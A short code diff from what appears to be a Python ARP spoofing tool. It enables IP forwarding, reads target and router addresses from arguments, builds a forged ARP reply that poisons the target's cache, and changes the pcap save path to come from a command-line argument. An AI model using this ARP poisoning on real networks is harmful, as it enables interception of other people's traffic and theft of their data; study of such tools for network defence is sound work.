@@ -8,7 +8,7 @@ from time import sleep
 system("clear")
 system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-path = raw_input("where do you want to save the pcap file? ")
+path = sys.argv[4]
 TargetIP = sys.argv[2]
 RouterIP = sys.argv[3]
 TargetAtk = ARP(op=2,psrc=RouterIP,pdst=TargetIP)
